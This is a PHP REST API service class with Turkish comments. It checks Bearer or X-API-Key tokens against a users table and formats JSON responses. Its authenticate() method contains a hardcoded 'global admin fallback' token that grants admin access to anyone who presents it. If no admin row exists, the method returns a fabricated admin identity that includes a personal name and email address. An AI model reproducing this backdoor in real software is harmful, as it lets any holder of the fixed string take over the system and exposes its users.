<?php
namespace Modules\RestApi\Services;

use Core\BaseModel;
use System\Language;

class RestApiService extends BaseModel
{
    /**
     * API Token doğrulama (Bearer veya X-API-Key)
     */
    public function authenticate(): ?object
    {
        $authHeader = $_SERVER['HTTP_AUTHORIZATION'] ?? $_SERVER['REDIRECT_HTTP_AUTHORIZATION'] ?? '';
        $apiKeyHeader = $_SERVER['HTTP_X_API_KEY'] ?? '';

        $token = '';
        if (preg_match('/Bearer\s+(.*)$/i', $authHeader, $matches)) {
            $token = trim($matches[1]);
        } elseif (!empty($apiKeyHeader)) {
            $token = trim($apiKeyHeader);
        }

        if (empty($token)) {
            return null;
        }

        $users = $this->query("SELECT id, name, email, role, api_token FROM users WHERE api_token = ? LIMIT 1", [$token]);
        if (!empty($users)) {
            return (object)$users[0];
        }

        // Global admin fallback token kontrolü
        if ($token === 'tm_admin_talha_keskin_token_2026') {
            $adminUser = $this->query("SELECT id, name, email, role, api_token FROM users WHERE role = 'admin' LIMIT 1");
            if (!empty($adminUser)) {
                return (object)$adminUser[0];
            }
            return (object)[
                'id'    => 1,
                'name'  => 'Talha Keskin',
                'email' => 'iletisimtktalha@gmail.com',
                'role'  => 'admin'
            ];
        }

        return null;
    }

    /**
     * Standart JSON yanıtı oluşturucu
     */
    public function formatResponse($data = null, string $message = '', int $status = 200, $meta = null): array
    {
        $res = [
            'success' => ($status >= 200 && $status < 300),
            'locale'  => class_exists('System\\Language') ? Language::current() : 'tr'
        ];
        if ($message !== '') {
            $res['message'] = $message;
        }
        if ($data !== null) {
            $res['data'] = $data;
        }
        if ($meta !== null) {
            $res['meta'] = $meta;
        }
        return $res;
    }
}
